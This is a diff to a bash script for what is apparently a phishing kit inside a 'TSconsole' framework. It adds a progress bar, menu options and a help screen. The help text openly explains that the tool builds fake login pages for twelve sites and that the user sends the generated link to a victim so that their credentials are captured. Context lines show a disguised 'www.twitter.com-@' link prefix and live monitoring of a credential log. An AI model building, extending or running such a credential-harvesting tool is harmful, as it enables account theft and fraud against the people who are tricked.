@@ -6,6 +6,92 @@ __banner__() {
 cat banner | pv -qL 300 | lolcat
 echo
 }
+#<<<----------Processbar---------->>>
+processbar()
+{
+   bar=" #######################################################"
+   barlenght=${#bar}
+   i=o
+   while ((i < 100 )); do
+           n=$((i*barlenght / 100 ))
+           printf "\e[00;35m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
+           ((i += RANDOM%5+2))
+           sleep 0.01
+   done
+}
+
+#<<<----------HELP---------->>>
+__help__() {
+echo -e "
+
+<==============================HELP MENUE==============================>
+
+About this tool:-
+This is a phishing tool established in this TSconsole-framework
+By:- me (Suman kumar ~BHUTUU)!!
+
+Now if you are a beginner then you must be thinking that -
+What is phishing??
+
+Answer:- Phishing is a type of social engineering where an attacker
+sends a fraudulent message designed to trick a human victim into
+revealing sensitive information to the attacker or to deploy
+malicious software on the victim's infrastructure like ransomware.
+
+For more detail of phishing you may search it on internet 🤗
+
+* BY this tool be will create a fake login page of respective
+sites which are mention in its site list
+
+*You have following valid options in this module:-
+1. you can enter number from one to twelve as there are twelve
+options are there in site list to use them
+
+  you can enter these number in one digit or two digits
+  examples:-
+	    1  or  01
+	    5  or  05
+ MOTE:- numbers which are already in two digits must be enter
+as they are i.e. two digits.
+  examples:-
+                 10
+                 11
+and last is:-    12
+
+
+2. option:- list
+ use:- to show the list of sites.
+
+3. option:- banner
+  use :- This option will show you the banner of the phishing tool :)
+
+4. option:- help or ?
+  use:- This option will show you the same help menue you are reading ;)
+
+5. option:- back
+  use:- This option will close this phishing program and let you to main menue
+        of TSconsole!
+
+6. option:- report
+  use:- you can directly report me (if any issue or bug you found) on Telegram :)
+    NOTE:- option:- report may not work for all users :/
+
+<-----x--options--x----->
+
+*if you are using android device and emulator is other than TERMUX
+ then you must switch on the mobile hotspot otherwise it will work!!
+
+NOTE:- For termux and computer users its all right no need of hotspot!!
+
+* when you choose any site option it will provide you some links of the
+ respective site in which any one of them you have to send to your victim.
+ when your victim  will enter his/her credential and press login, all that
+ credential will be delivered to you !
+
+<>----THANKYOU----<>
+" | pv -qL 1000 | lolcat
+}
+
 __banner__
 #<<<----------colour substitution by variables---------->>>
 C0="$(printf '\033[90m')"  B0="$(printf '\033[100m')"
@@ -105,8 +191,17 @@ pfolder='twitter'
 hoster='www.twitter.com-@'
 break
 
+elif [[ $phis == 'banner' ]]; then
+__banner__
+
+elif [[ $phis == 'help' || $phis == '?' ]]; then
+__help__
+
+elif [[ $phis == 'report' ]]; then
+xdg-open https://t.me/Suman_bhutuu
+
 elif [[ $phis == 'back' ]]; then
-exit
+exit 1
 
 else
 echo
@@ -115,7 +210,9 @@ echo
 fi
 done
 
-
+echo
+processbar
+echo
 cd sites/
 cd ${pfolder}/
 echo
@@ -154,3 +251,4 @@ fi
 echo
 echo
 tail -f log.txt
+
